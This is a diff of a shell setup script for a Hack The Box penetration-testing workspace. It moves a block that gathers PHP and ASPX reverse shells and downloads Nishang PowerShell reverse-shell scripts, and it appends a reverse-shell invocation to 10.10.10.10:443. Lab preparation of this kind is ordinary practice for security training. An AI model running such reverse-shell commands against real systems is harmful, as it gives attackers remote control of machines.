@@ -19,18 +19,8 @@ cd ~
 mkdir htb 2>/dev/null
 cd htb
 
-#copy reverse shells
-cd ~/htb
-mkdir reverse-shell 2>/dev/null
-cd reverse-shell
-cp ~/my_data/g/black-badge/Doc/CC/Reverse-Shell-scripts/php-reverse-shell.php ./prss.php
-cp ~/my_data/g/black-badge/Doc/CC/Reverse-Shell-scripts/aspx-shell.aspx ./shell.aspx
-wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O Invoke-PowerShellTcp.ps1
-wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 -O powershelltcp.ps1
-echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443" >> Invoke-PowerShellTcp.ps1
-
 #add start python web server script:
-echo "sudo python3 -m http.server 666" > start-pythonwebserver.sh
+echo "sudo python3 -m http.server 6666" > start-pythonwebserver.sh
 chmod +x start-pythonwebserver.sh
 
 #generate keypair for target logon
@@ -40,6 +30,20 @@ cd rsa
 ssh-keygen -t rsa -b 4096 -C "htb@woodenshoe" -f ./htb_rsa -q -N "" <<<y 2>&1 >/dev/null
 
 
+
+################################################################
+#reverse shells
+cd ~/htb
+mkdir reverse-shell 2>/dev/null
+cd reverse-shell
+cp ~/my_data/g/black-badge/Doc/CC/Reverse-Shell-scripts/php-reverse-shell.php ./prss.php
+cp ~/my_data/g/black-badge/Doc/CC/Reverse-Shell-scripts/aspx-shell.aspx ./shell.aspx
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O Invoke-PowerShellTcp.ps1
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 -O powershelltcp.ps1
+echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443" >> Invoke-PowerShellTcp.ps1
+
+echo "git clone https://github.com/interference-security/kali-windows-binaries.git 2>/dev/null" > download-kali-windows.sh
+chmod +x download-kali-windows.sh
 
 
 ################################################################
